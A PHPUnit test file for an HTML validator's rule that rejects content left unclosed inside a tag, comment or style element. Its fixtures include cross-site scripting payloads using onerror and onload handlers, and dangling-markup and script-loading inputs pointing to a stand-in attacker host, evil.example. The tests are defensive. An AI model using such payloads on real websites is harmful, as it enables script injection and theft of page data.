<?php
declare(strict_types=1);

namespace Itools\HtmlValidator\Tests\Unit;

use Itools\HtmlValidator\HtmlValidator;
use Itools\HtmlValidator\Tests\Support\HtmlValidatorTestCase;
use PHPUnit\Framework\Attributes\DataProvider;

/**
 * Content that ends inside a tag, a comment, or a raw-text element. A browser drops the
 * unfinished piece at the end of a document, but the CMS prints a field into a page, so the
 * page after it is read as part of the tag, comment, or style sheet (dangling markup).
 *
 * Code: unclosed-markup.
 */
final class UnclosedMarkupTest extends HtmlValidatorTestCase
{
    #[DataProvider('unclosedProvider')]
    public function testUnclosedMarkup(string $html, string $detail): void
    {
        $violation = $this->assertRejects($html, 'unclosed-markup', $detail);
        $this->assertSame("$detail is not closed", $violation->message);
    }

    public static function unclosedProvider(): array
    {
        return [
            'tag'                    => ['<p>x</p><img src="/x.png"', '<img src="/x.png"'],
            'quoted value'           => ['<p>x</p><img src="//evil.example/?', '<img src="//evil.example/?'],
            'unquoted value'         => ['<img src=x onerror=alert(1)', '<img src=x onerror=alert(1)'],
            'handler on the tag'     => ['<svg onload=alert(1) ', '<svg onload=alert(1) '],
            'refused tag'            => ['<script src="//evil.example/x.js"', '<script src="//evil.example/x.js"'],
            'end tag'                => ['<p>x</p', '</p'],
            'comment'                => ['<p>x</p><!-- hidden', '<!-- hidden'],
            'comment with partial'   => ['<!-- x --', '<!-- x --'],
            'bogus comment'          => ['<?php echo 1;', '<?php echo 1;'],
            'style element'          => ['<style>p { color: red }', '<style>p { color: red }'],
            'iframe element'         => ['<iframe src="https://www.youtube.com/embed/x">', '<iframe src="https://www.youtube.com/embed/x">'],
            'newlines in the detail' => ["<a\nhref=\"x", '<a\nhref="x'],
        ];
    }

    public function testTextareaWithFormsOn(): void
    {
        $this->withSettings(['allowForms' => true], function () {
            $this->assertRejects('<textarea>x', 'unclosed-markup', '<textarea>x');
        });
    }

    public function testLongSourceIsCut(): void
    {
        $css       = str_repeat('p { color: red } ', 10);
        $violation = $this->assertRejects("<style>$css", 'unclosed-markup');
        $this->assertSame(HtmlValidator::$maxDetailLength + 3, strlen($violation->detail));
        $this->assertStringEndsWith('...', $violation->detail);
    }

    public function testOtherErrorsStillReport(): void
    {
        $result = HtmlValidator::check('<style>p { width: expression(1) }');
        $this->assertSame(['css-not-allowed', 'unclosed-markup'], array_column($result->errors, 'code'));
    }

    #[DataProvider('closedProvider')]
    public function testClosedMarkupPasses(string $html): void
    {
        $this->assertAccepts($html);
    }

    public static function closedProvider(): array
    {
        return [
            'tags'                 => ['<p>x</p>'],
            'void tag'             => ['<p>x<br></p>'],
            'self-closing tag'     => ['<img src="/x.png"/>'],
            'lone less-than'       => ['<p>1 < 2</p> and one at the end <'],
            'lone end tag open'    => ['<p>x</p></'],
            'comment'              => ['<!-- x -->'],
            'style element'        => ['<style>p { color: red }</style>'],
            'greater-than in text' => ['<p>x</p> 3 > 2'],
            'empty'                => [''],
        ];
    }
}
